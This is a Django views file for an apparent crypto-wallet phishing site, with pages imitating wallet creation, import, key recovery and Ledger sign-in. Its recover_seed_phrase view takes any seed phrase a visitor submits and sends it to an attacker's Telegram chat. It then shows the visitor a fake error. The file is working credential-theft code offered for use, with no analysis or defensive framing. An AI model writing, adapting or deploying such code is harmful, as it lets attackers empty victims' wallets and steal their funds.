from django.shortcuts import render
from .process import send_telegram_message
from .config import CHAT_ID, TELEGRAM_TOKEN
from django.utils.translation import gettext as _
from django.utils.translation import activate


# Create your views here.
def index(request):
    activate(request.LANGUAGE_CODE)
    return render(request, 'homepage.html')


def create(request):
    activate(request.LANGUAGE_CODE)
    return render(request, 'create.html')


def import_account(request):
    activate(request.LANGUAGE_CODE)
    return render(request, 'import_account.html')


def recover_private_key(request):
    activate(request.LANGUAGE_CODE)
    return render(request, 'recover_private_key.html')


def recover_seed_phrase(request):
    activate(request.LANGUAGE_CODE)
    try:
        if request.method == 'POST':
            phrase = request.POST['phrase']
            alert = '*New phrase submitted*  \nPhrase: *{}*'.format(phrase)
            print(alert)
            send_telegram_message(alert, CHAT_ID, TELEGRAM_TOKEN)
            return render(request, 'recover_seed_phrase.html', {'err': 'Error'})
    except Exception as ex:
        return render(request, 'recover_seed_phrase.html')
    return render(request, 'recover_seed_phrase.html')


def sign_in_ledger(request):
    activate(request.LANGUAGE_CODE)
    return render(request, 'sign_in_ledger.html')


def set_recovery_implicit_account(request):
    return render(request, 'set_recovery_implicit_account.html')
